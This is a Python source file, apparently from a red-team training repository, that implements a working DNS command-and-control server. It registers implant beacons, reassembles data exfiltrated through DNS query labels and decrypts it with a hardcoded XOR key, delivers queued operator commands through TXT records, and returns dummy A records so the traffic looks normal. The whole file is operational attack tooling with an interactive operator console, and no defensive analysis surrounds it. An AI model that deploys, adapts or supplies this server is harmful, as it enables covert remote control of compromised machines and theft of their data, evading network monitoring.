# c2_frameworks/dns/server.py
"""
DNS C2 Authoritative Server
Receives exfiltrated data via malicious-looking-but-legit DNS queries
Delivers commands via dynamic TXT records
Runs on any VPS with BIND9, PowerDNS, or dnsdist + Python responder
This version: pure Python DNS responder using dnslib
Zero dependencies beyond standard library + dnslib
"""

import socket
import threading
import time
import json
import os
from datetime import datetime
from collections import defaultdict

try:
    from dnslib import DNSRecord, DNSHeader, RR, TXT, A
except ImportError:
    print("[-] Install dnslib: pip install dnslib")
    exit(1)

from .utils import (
    dns_safe_base32_decode,
    xor_shuffle,
    parse_exfil_query,
    generate_session_id
)

class DNSC2Server:
    def __init__(self, domain: str, listen_ip: str = "0.0.0.0", port: int = 53):
        self.domain = domain.rstrip(".").lower()
        self.listen_ip = listen_ip
        self.port = port
        
        # Storage
        self.sessions = {}                    # session_id → metadata
        self.exfil_buffer = defaultdict(dict) # session_id → {chunk_id: data}
        self.pending_commands = {}            # session_id → command

        print(f"[+] DNS C2 Server Starting")
        print(f"[+] Domain     : {self.domain}")
        print(f"[+] Listening  : {listen_ip}:{port} (UDP)\n")

    def handle_query(self, data, addr):
        """Process incoming DNS query"""
        try:
            q = DNSRecord.parse(data)
            qname = str(q.q.qname).lower().rstrip(".")

            # Only handle queries for our domain
            if not qname.endswith(self.domain):
                return self._nxdomain(q)

            labels = qname[:-len(self.domain)-1].split(".")  # strip domain

            # Beacon detection
            if len(labels) >= 2 and labels[0] == "beacon":
                session_id = labels[1]
                self._register_session(session_id, addr[0])
                return self._empty_response(q)

            # Exfil detection
            parsed = parse_exfil_query(qname)
            if parsed:
                self._handle_exfil(parsed, addr[0])
                return self._empty_response(q)

            # Task delivery (TXT request)
            if len(labels) >= 2 and labels[0] == "task":
                session_id = labels[1]
                command = self.pending_commands.get(session_id)
                if command:
                    resp = q.reply()
                    resp.add_answer(RR(qname, rtype=16, rdata=TXT(f'cmd:{command}')))
                    del self.pending_commands[session_id]
                    print(f"    → Delivered command to {session_id}")
                    return resp.pack()
                
                return self._empty_response(q)

        except Exception as e:
            print(f"[-] Query parse error: {e}")

        return self._nxdomain(q)

    def _register_session(self, session_id: str, src_ip: str):
        if session_id not in self.sessions:
            print(f"\n[+] NEW IMPLANT ONLINE")
            print(f"    Session : {session_id}")
            print(f"    From IP : {src_ip}")
            print(f"    Time    : {datetime.utcnow().isoformat()}Z\n")
        
        self.sessions[session_id] = {
            "first_seen": datetime.utcnow().isoformat() + "Z",
            "last_seen": datetime.utcnow().isoformat() + "Z",
            "src_ip": src_ip
        }

    def _handle_exfil(self, parsed: dict, src_ip: str):
        sid = parsed["session_id"]
        cid = parsed["chunk_id"]
        total = parsed["total_chunks"]
        chunk = parsed["payload_chunk"]

        self.exfil_buffer[sid][cid] = chunk

        print(f"[*] Exfil chunk {cid+1}/{total} from {sid} ({src_ip})")

        # All chunks received?
        if len(self.exfil_buffer[sid]) == total:
            print(f"\n[+] FULL EXFIL RECEIVED → {sid}\n")
            full_b32 = "".join(self.exfil_buffer[sid][i] for i in sorted(self.exfil_buffer[sid]))
            try:
                encrypted = dns_safe_base32_decode(full_b32)
                decrypted = xor_shuffle(encrypted, b"30DaysRedTeam")  # symmetric
                output = decrypted.decode(errors="ignore")
                print(output.strip())
                print("\n" + "─" * 60 + "\n")
            except Exception as e:
                print(f"[-] Decode failed: {e}")
            
            # Clean up
            self.exfil_buffer.pop(sid, None)

    def _empty_response(self, q):
        """Return valid but empty A record (keeps traffic looking normal)"""
        resp = q.reply()
        resp.add_answer(RR(q.q.qname, rtype=1, rdata=A("127.0.0.1")))
        return resp.pack()

    def _nxdomain(self, q):
        resp = q.reply()
        resp.header.rcode = 3  # NXDOMAIN
        return resp.pack()

    def send_command(self, session_id: str, command: str):
        """Queue command for next agent check-in"""
        self.pending_commands[session_id] = command
        print(f"[+] Command queued for {session_id}: {command}")

    def list_sessions(self):
        print("\nActive Sessions:")
        for sid, data in self.sessions.items():
            print(f"  • {sid} | {data['src_ip']} | last: {data['last_seen'][-12:]}")

    def interactive(self):
        print("DNS C2 Server Console")
        print("Commands: list | cmd <session> <command> | quit\n")
        while True:
            try:
                line = input("dns-c2> ").strip()
                if not line:
                    continue
                if line == "list":
                    self.list_sessions()
                elif line.startswith("cmd "):
                    parts = line[4:].split(" ", 1)
                    if len(parts) < 2:
                        print("Usage: cmd abcd1234 whoami")
                        continue
                    self.send_command(parts[0], parts[1])
                elif line in ["quit", "exit"]:
                    break
            except KeyboardInterrupt:
                break

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.listen_ip, self.port))
        print(f"[+] DNS server listening on {self.listen_ip}:{self.port}\n")

        # Start interactive console in background
        threading.Thread(target=self.interactive, daemon=True).start()

        while True:
            try:
                data, addr = sock.recvfrom(8192)
                response = self.handle_query(data, addr)
                if response:
                    sock.sendto(response, addr)
            except KeyboardInterrupt:
                print("\n[+] Server stopped.")
                break
            except Exception as e:
                print(f"[-] Socket error: {e}")

# ——— Entry Point ———
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="DNS C2 Authoritative Server")
    parser.add_argument("--domain", required=True, help="Your controlled domain")
    parser.add_argument("--ip", default="0.0.0.0", help="Listen IP")
    parser.add_argument("--port", type=int, default=53, help="Listen port")
    args = parser.parse_args()

    server = DNSC2Server(domain=args.domain, listen_ip=args.ip, port=args.port)
    server.run()